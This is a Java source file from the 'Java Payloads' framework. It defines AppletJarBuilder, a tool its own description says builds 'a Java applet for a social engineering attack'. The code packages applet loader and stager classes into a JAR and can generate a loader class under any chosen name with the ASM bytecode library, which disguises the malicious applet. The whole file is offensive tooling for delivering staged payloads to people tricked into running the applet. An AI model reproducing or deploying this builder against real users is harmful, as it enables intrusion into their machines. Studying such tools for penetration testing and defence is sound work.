/*
 * Java Payloads.
 * 
 * Copyright (c) 2010, 2011 Michael 'mihi' Schierl
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 
 * - Redistributions of source code must retain the above copyright notice,
 *   this list of conditions and the following disclaimer.
 *   
 * - Redistributions in binary form must reproduce the above copyright
 *   notice, this list of conditions and the following disclaimer in the
 *   documentation and/or other materials provided with the distribution.
 *   
 * - Neither name of the copyright holders nor the names of its
 *   contributors may be used to endorse or promote products derived from
 *   this software without specific prior written permission.
 *   
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND THE CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * HOLDERS OR THE CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT,
 * INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING,
 * BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS
 * OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND
 * ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
 * TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE
 * USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package javapayload.builder;

import java.util.jar.Manifest;

import javapayload.loader.DynStagerURLStreamHandler;

import org.objectweb.asm.ClassWriter;
import org.objectweb.asm.MethodVisitor;
import org.objectweb.asm.Opcodes;

public class AppletJarBuilder extends Builder {
	public static void main(String[] args) throws Exception {
		if (args.length == 0) {
			System.out.println("Usage: java javapayload.builder.AppletJarBuilder [--name some.java.ClassName] "+JarBuilder.ARGS_SYNTAX);
			return;
		}
		new AppletJarBuilder().build(args);
	}
	
	public AppletJarBuilder() {
		super("Build a Java applet for a social engineering attack.", "");
	}
	
	public String getParameterSyntax() {
		return "[--name some.java.ClassName] "+JarBuilder.ARGS_SYNTAX;
	}
	
	public void build(String[] args) throws Exception {
		Class[] baseClasses = new Class[] {
				javapayload.loader.AppletLoader.class,
				javapayload.loader.AppletLoader.ReadyNotifier.class,
				javapayload.stager.Stager.class,
		};
		if (args[0].equals("--name")) {
			final String className = args[1];
			String[] newArgs = new String[args.length-2];
			System.arraycopy(args, 2, newArgs, 0, newArgs.length);
			args = newArgs;
			
			final ClassWriter cw = new ClassWriter(0);
			cw.visit(Opcodes.V1_1, Opcodes.ACC_PUBLIC + Opcodes.ACC_SUPER, className.replace('.', '/'), null, "javapayload/loader/AppletLoader", null);
			MethodVisitor mv = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
			mv.visitCode();
			mv.visitVarInsn(Opcodes.ALOAD, 0);
			mv.visitMethodInsn(Opcodes.INVOKESPECIAL, "javapayload/loader/AppletLoader", "<init>", "()V");
			mv.visitInsn(Opcodes.RETURN);
			mv.visitMaxs(1, 1);
			mv.visitEnd();
			cw.visitEnd();
			DynStagerURLStreamHandler ush = DynStagerURLStreamHandler.getInstance();
			ush.addClass(className, cw.toByteArray());
			baseClasses = new Class[] {
					ush.getDynClassLoader().loadClass(className),
					baseClasses[0],
					baseClasses[1],
					baseClasses[2],
			};
		}
		JarBuilder.buildJarFromArgs(args, "Applet", baseClasses, new Manifest(), null, null);
	}
}
